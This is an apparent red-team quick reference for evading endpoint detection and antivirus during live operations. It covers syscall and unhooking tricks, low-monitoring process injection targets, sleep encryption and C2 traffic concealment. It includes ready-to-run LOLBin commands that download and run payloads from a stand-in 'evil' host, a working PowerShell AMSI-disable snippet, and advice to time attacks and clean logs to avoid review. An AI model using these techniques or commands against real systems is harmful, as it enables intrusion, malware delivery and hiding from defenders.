# EDR/AV Bypass and Stealth Techniques Quick Reference

> Source: Summarized from multiple red team实战经验 (2024-2026)
> Applicable Scenarios: For reference when executing operations in environments with EDR/AV protection

---

## Detection Layers and Corresponding Bypasses

| Detection Layer | EDR Does What | Bypass Ideas |
|-----------------|---------------|--------------|
| Static Signature | Matches known malicious file hash/features | Custom compilation, payload encryption, modifying features |
| User-mode Hook | Hooks ntdll.dll to monitor API calls | Direct system call / Unhooking / Built-in ntdll |
| Kernel Callback | Registers process/thread/image load callbacks | Callback removal (requires driver) / Legal process injection |
| ETW | Collects events through ETW | Patch EtwEventWrite / Disable provider |
| Behavior Analysis | Analyzes call sequences and behavior patterns | Delayed execution / Distributed operations / Mimic normal behavior |
| Memory Scan | Regularly scans process memory | Heap encryption / Encrypt payload during sleep / Module stomping |
| Network Detection | Analyzes outbound traffic features | Domain fronting / Legal service tunnel / Encryption |

---

## Practical Bypass Techniques

### 1. Direct System Call (Bypass User-mode Hook)

```
Principle: Calls the kernel directly without using ntdll.dll, via the syscall instruction
Tools: SysWhispers3 / HellsGate / TartarusGate
Effect: Bypasses all user-mode hooks
```

### 2. Unhooking (Restore Original ntdll)

```
Method A: Remap ntdll.dll from disk
Method B: Load a clean copy from the KnownDlls directory
Method C: Copy the .text segment from a suspended process
Effect: Restores hooked APIs to their original state
```

### 3. Process Injection (Select Low-Monitoring Targets)

```
Recommended injection targets (low monitoring):
- RuntimeBroker.exe
- sihost.exe
- taskhostw.exe
- explorer.exe (slightly higher risk)

Avoid injecting:
- lsass.exe (highly monitored)
- svchost.exe (partially focused on by some EDRs)
- powershell.exe / cmd.exe
```

### 4. Module Stomping

```
Principle: Writes payload into the .text segment of a loaded legitimate DLL
Effect: Memory scans show a legitimate module, not suspicious RWX memory
```

### 5. Sleep Encryption (Ekko/Zilean)

```
Principle: Encrypts itself in memory during beacon sleep
Effect: Payload features are not found during memory scans
Implementation: Register Timer callback, encrypt before sleep, decrypt on wake
```

### 6. Call Stack Spoofing

```
Principle: Forges the call stack to make API calls appear to come from legitimate code
Effect: Bypasses behavior detection based on call stacks
```

---

## C2 Traffic Concealment

| Technique | Principle | Detection Difficulty |
|-----------|-----------|----------------------|
| Domain Fronting | Different SNI and Host headers in HTTPS requests | High |
| Cloudflare Workers | Transports through CF, appears as normal HTTPS | High |
| Azure/AWS Legal Services | Uses cloud service APIs for C2 channels | Extremely high |
| DNS over HTTPS | Encodes C2 data in DNS queries | Medium |
| WebSocket | Long-lived connection, mixed with normal web traffic | Medium |
| ICMP Tunneling | Hides data in ICMP packets | Low (easily detectable) |

---

## LOLBins (Living Off the Land)

Using built-in legitimate programs to execute malicious operations:

| Program | Purpose | Command Example |
|---------|---------|-----------------|
| certutil | Download file | `certutil -urlcache -split -f http://evil/payload.exe` |
| mshta | Execute HTA | `mshta http://evil/payload.hta` |
| rundll32 | Load DLL | `rundll32 evil.dll,EntryPoint` |
| regsvr32 | Load SCT | `regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll` |
| wmic | Remote execution | `wmic /node:target process call create "cmd"` |
| msiexec | Install MSI | `msiexec /q /i http://evil/payload.msi` |
| bitsadmin | Download file | `bitsadmin /transfer job http://evil/payload.exe C:\payload.exe` |
| forfiles | Execute command | `forfiles /p c:\windows /m notepad.exe /c "cmd /c calc.exe"` |

---

## AMSI Bypass (PowerShell)

```powershell
# Classic Patch (may be detected by signature checks)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# More隐蔽的方式：反射修改 AmsiScanBuffer
# 或使用 PowerShell 降级到 v2（无 AMSI）
powershell -version 2
```

---

## Operational Security (OpSec) Principles

1. **Principle of Least Privilege** — Don't touch what you don't need to, use existing credentials if possible
2. **Timing Window** — Perform operations during non-working hours of the target (reduces probability of manual review)
3. **Traffic Mixing** — Simulate normal business traffic by mimicking C2 communication frequency and size
4. **No Tool Persistence** — Execute in memory, clean up after use
5. **Log Awareness** — Know which operations generate logs, proactively avoid or clean up post-incident
6. **Honeypot Identification** — Identify honeypots before the operation (abnormally open services, overly enticing credentials)
7. **Segmented Operations** — Don't complete all steps in one go, distribute over multiple time periods